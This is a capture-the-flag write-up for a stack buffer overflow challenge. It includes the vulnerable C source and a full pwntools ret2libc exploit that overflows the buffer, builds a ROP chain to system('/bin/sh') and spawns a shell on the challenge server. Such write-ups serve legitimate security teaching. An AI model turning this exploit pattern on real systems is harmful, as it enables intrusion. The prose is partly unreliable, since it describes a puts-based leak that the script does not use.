# Write-up of the challenge "Mitt andra program"

This challenge is part of the **"Binary exploitation"** category and earns 400 points. This challenge was presented in the finals of **"SSM 2025"**.

# Goal of the challenge

The objective of the challenge is to use ROP **"ret2libc"** to spawn a shell and read the flag.

## Program structure

```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char name[100];

    setvbuf(stdout, NULL, _IONBF, 0); // Disable output buffering
    setvbuf(stdin, NULL, _IONBF, 0); // Disable input buffering

    printf("Välkommen till mitt andra program! Mitt tur-tal idag är %p. Vad heter du?\n", system);
    fgets(name, 0x100, stdin);
    name[strcspn(name, "\n")] = 0;
    printf("Hej %s! Hoppas du har en bra dag!!!\n", name);
    return 0;
}


```

## Problem

The main problem I encountered while doing this challenge was figuring out whether there was a shorter way than using **"ret2libc"**. After thinking about it for 20 straight minutes, I gave up and decided to use **"ret2libc"**. The libc was protected using **"PIE"** but that was easy to work around. We simply had to leak the address of puts using **"puts_plt"** and **"puts_got"** from the binary and then subtract it using the **"puts"** symbol in libc. This allowed us to calculate the libc base address. Then we can freely use ROP to do whatever we want!

## Security breach

The security flaws lies into there is buffer overflow where the name variable is **"100 bytes"** but the fgets is reading **"0x100 bytes"**. That's good for us becuase
we can use it to overrite the **"$RIP"** and excute mailcious code.

## Solution

In the end, I wrote a **"solve.py"** script that leaks **"puts_got"** using **"puts_plt"** from the binary and then subtracts it from **puts** in libc. After that, we set the libc base address and build a ROP chain around it. Since we know the base address, we can also spawn a shell using libc.

```python
from pwn import *
import re

# p = process('./chall')

p = remote('ssmarkiv.ctfchall.se', 40131)
context.binary = libc_elf = ELF('./libc.so.6')

offset = (112 + 8)

leak = p.recvline()
filtered = re.search(rb'0x[0-9a-fA-F]+', leak).group(0).decode()
base = int(filtered, 16) - libc_elf.sym['system']
libc_elf.address = base

rops = ROP(libc_elf)

pop_rdi = rops.find_gadget(['pop rdi', 'ret'])[0]
ret = rops.find_gadget(['ret'])[0]
binish = next(libc_elf.search(b'/bin/sh'))
system = libc_elf.sym['system']

payload = b'A' * offset + p64(ret) + p64(pop_rdi) + p64(binish) + p64(system)

p.sendline(payload)

p.interactive()

```

After that, I ran it, spawned a shell, and executed **"cat flag.txt"**.

If you liked this writeup you can star my repository.